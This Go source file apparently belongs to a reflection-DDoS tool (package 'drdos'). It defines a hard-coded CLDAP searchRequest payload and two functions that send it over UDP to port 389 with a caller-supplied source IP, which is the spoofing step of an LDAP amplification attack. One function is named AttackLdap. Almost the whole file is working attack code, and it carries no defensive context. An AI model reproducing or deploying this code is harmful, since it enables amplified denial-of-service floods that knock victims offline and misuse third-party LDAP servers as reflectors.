package drdos

import (
	"drdos/config"
	"drdos/utils"
)

/*
	This is under check
	Referer: https://www.freebuf.com/articles/network/181884.html
*/

var (
	ldapPayload []byte
	ldapDport   int
)

func init() {
	// 4 random bytes
	ldapDport = 389
	ldapPayload = append(ldapPayload, []byte{48, 37, 2, 1, 1, 99, 32, 4, 0, 10}...)
	ldapPayload = append(ldapPayload, []byte{1, 0, 10, 1, 0, 2, 1, 0, 2, 1}...)
	ldapPayload = append(ldapPayload, []byte{0, 1, 1, 0, 135, 11, 111, 98, 106, 101}...)
	ldapPayload = append(ldapPayload, []byte{99, 116, 99, 108, 97, 115, 115, 48, 0, 0}...)
}

func CheckLdap(dstip string, srcip string) error {
	return utils.SendUdpPack(dstip, srcip, ldapDport, config.ListenPort, ldapPayload)
}

func AttackLdap(dstip string, srcip string, port int) error {
	return utils.SendUdpPack(dstip, srcip, ldapDport, port, ldapPayload)
}
